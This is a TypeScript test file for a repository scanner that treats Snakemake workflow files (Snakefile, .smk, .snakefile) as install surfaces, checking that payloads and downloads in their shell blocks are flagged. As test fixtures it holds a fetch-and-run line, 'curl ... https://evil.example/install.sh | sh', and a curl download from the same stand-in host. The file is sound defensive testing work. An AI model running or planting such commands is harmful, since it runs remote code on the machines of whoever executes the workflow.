import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Snakefile workflow is an install surface", () => {
  // A Snakefile is the workflow definition Snakemake runs: every rule's
  // shell block executes on the machine running the workflow — the same
  // install-time execution setup.py already classifies for. The file
  // always carries this exact name, at a repository root or nested in a
  // workflow directory; the name alone decides.
  for (const path of ["Snakefile", "workflow/Snakefile"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary payload in it carries the install coverage the surface
  // brings:
  const inspection = inspected(
    "Snakefile",
    `rule build:\n    shell:\n        "${PAYLOAD}"\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Snakefile:unsafe-execution:high"]);
});

test("an install-time download inside a Snakefile is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the workflow carried no surface at all, so the same
  // bytes recorded no download and left no gap: a scan could read clean
  // over an install-time fetch Snakemake would have run while executing
  // the workflow.
  const inspection = inspected(
    "Snakefile",
    'rule fetch:\n    shell:\n        "curl -fsSL https://evil.example/payload -o /tmp/payload"\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Snakefile keeps no finding", () => {
  const inspection = inspected(
    "Snakefile",
    'rule all:\n    input: "out.txt"\n\nrule make:\n    output: "out.txt"\n    shell: "cp data/in.txt {output}"\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});

test("included rule files and named Snakefiles are install surfaces", () => {
  // Snakemake's standard modular layout keeps the executable rules in
  // files the root Snakefile loads with include: — conventionally
  // workflow/rules/*.smk — while a workflow file passed explicitly is
  // often named <name>.snakefile. Their shell: and run: blocks execute
  // on the host exactly like the root Snakefile's, so the extension
  // decides, the same way <name>.cmake identifies a build definition.
  for (const path of [
    "workflow/rules/fetch.smk",
    "workflows/variant.snakefile",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  const inspection = inspected(
    "workflow/rules/fetch.smk",
    `rule fetch:\n    shell:\n        "${PAYLOAD}"\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["workflow/rules/fetch.smk:unsafe-execution:high"]);
});

test("an install-time download inside an included rule file is recorded as a download", () => {
  // Downloads are collected from install surfaces only. With only the
  // exact Snakefile name classified, a fetch inside an included .smk
  // module recorded no download and left no gap, even though Snakemake
  // runs it while executing the workflow.
  const inspection = inspected(
    "workflow/rules/dl.smk",
    'rule dl:\n    shell:\n        "curl -fsSL https://evil.example/payload -o /tmp/payload"\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary included rule file keeps no finding", () => {
  const inspection = inspected(
    "workflow/rules/common.smk",
    'rule make:\n    output: "out.txt"\n    shell: "cp data/in.txt {output}"\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
